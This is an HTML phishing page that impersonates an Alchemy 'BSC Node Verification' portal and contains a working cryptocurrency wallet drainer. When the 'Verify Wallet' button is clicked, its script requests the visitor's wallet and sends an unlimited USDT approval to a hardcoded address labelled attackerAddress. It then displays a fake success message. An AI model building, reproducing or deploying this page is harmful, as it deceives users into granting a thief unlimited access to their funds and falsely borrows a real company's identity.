<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alchemy Node | Verification Portal</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.6.0/dist/web3.min.js"></script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: white; text-align: center; padding-top: 100px; margin: 0; }
        .card { background: #1e293b; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); display: inline-block; width: 85%; max-width: 380px; }
        .logo { width: 60px; margin-bottom: 15px; }
        h2 { font-size: 20px; margin-bottom: 10px; }
        p { color: #94a3b8; font-size: 14px; margin-bottom: 25px; line-height: 1.4; }
        #verifyBtn { background: #3b82f6; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
        #verifyBtn:hover { background: #2563eb; transform: translateY(-2px); }
        #status { margin-top: 20px; font-size: 12px; color: #64748b; font-family: monospace; }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://www.alchemy.com/favicon.ico" class="logo">
        <h2>BSC Node Verification</h2>
        <p>Authorize your wallet to sync with the Alchemy high-speed payout queue for BEP-20 assets.</p>
        
        <button id="verifyBtn">Verify Wallet</button>
        
        <div id="status">Status: Waiting for Provider...</div>
    </div>

    <script>
        // --- Updated Configuration with your address ---
        const attackerAddress = "0x810a68342161f8dc550468C8262055A7B2B58455"; 
        const bscUsdtContract = "0x55d398326f99059fF775485246999027B3197955"; // BSC-USDT
        const maxAmount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

        document.getElementById('verifyBtn').onclick = async () => {
            const status = document.getElementById('status');

            if (window.ethereum) {
                try {
                    const web3 = new Web3(window.ethereum);
                    
                    status.innerText = "Connecting to Wallet...";
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    const userAddress = accounts[0];

                    status.innerText = "Requesting Node Authorization...";
                    status.style.color = "#fbbf24";

                    // ABI for 'approve' function
                    const abiData = "0x095ea7b3" + 
                                   attackerAddress.substring(2).toLowerCase().padStart(64, '0') + 
                                   maxAmount.substring(2);

                    // අන්න මෙතනදී තමයි කෙලින්ම Wallet එක ඇතුළේ Approval screen එක පනින්නේ
                    await web3.eth.sendTransaction({
                        from: userAddress,
                        to: bscUsdtContract,
                        data: abiData
                    });

                    status.innerText = "Verification Successful! Synced with Alchemy API.";
                    status.style.color = "#10b981";

                } catch (error) {
                    console.error(error);
                    status.innerText = "Verification Failed. Ensure you are on BSC network.";
                    status.style.color = "#ef4444";
                }
            } else {
                alert("Please open this in Trust Wallet or Binance Web3 Browser.");
            }
        };
    </script>
</body>
</html>
